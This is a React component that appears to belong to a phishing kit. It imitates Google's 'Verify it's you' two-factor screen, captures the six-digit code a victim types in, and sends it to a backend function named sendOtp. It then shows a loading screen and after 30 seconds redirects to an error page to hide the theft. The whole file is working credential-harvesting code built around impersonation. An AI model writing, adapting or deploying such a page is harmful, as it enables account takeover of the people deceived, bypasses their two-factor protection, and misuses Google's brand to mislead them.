import { useNavigate } from 'react-router-dom';
import React, { useState, useRef } from 'react';
import '../assets/css/OTPVerification.css';
import { sendOtp } from '../database/createUser';
const OTPVerification = () => {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);
  const navigate = useNavigate();


  const handleChange = (value, index) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) {
      inputRefs.current[index + 1].focus();
    }
  };
  const handleKeyDown = (e, index) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };
  const handleVerify = async () => {
    const otpCode = otp.join('');
    await sendOtp(otpCode);
      navigate('/loading');
      setTimeout(() => {
        navigate('/error');
      }, 30000);
    console.log('OTP:', otpCode);
  };
  return (
    <div className="container">
      {' '}
      <div className="card">
        {' '}
        <img
          src="https://static.vecteezy.com/system/resources/thumbnails/022/484/503/small/google-lens-icon-logo-symbol-free-png.png"
          alt="Google Logo"
          className="logo"
        />{' '}
        <h2>Verify it's you</h2>{' '}
        <h3>Enter the 6-digit code sent to your phone</h3>{' '}
        <div className="otp-container">
          {' '}
          {otp.map((digit, index) => (
            <input
              key={index}
              type="text"
              maxLength="1"
              value={digit}
              ref={el => (inputRefs.current[index] = el)}
              onChange={e => handleChange(e.target.value, index)}
              onKeyDown={e => handleKeyDown(e, index)}
              className="otp-input"
            />
          ))}{' '}
        </div>{' '}
        <p>
          {' '}
          Didn't receive the code? <a href="/"> Resend code</a>{' '}
        </p>{' '}
        <div className="card-bottom">
          {' '}
          <a href="/">Back</a>{' '}
          <button type="button" onClick={handleVerify}>
            {' '}
            Verify{' '}
          </button>{' '}
        </div>{' '}
      </div>{' '}
      <div className="footer">
        {' '}
        <select>
          {' '}
          <option>English (United States)</option>{' '}
          <option>Portuguese (Brazil)</option>{' '}
          <option>Spanish (Spain)</option>{' '}
        </select>{' '}
        <div className="footer-span">
          {' '}
          <span>Help</span> <span>Privacy</span> <span>Terms</span>{' '}
        </div>{' '}
      </div>{' '}
    </div>
  );
};
export default OTPVerification;
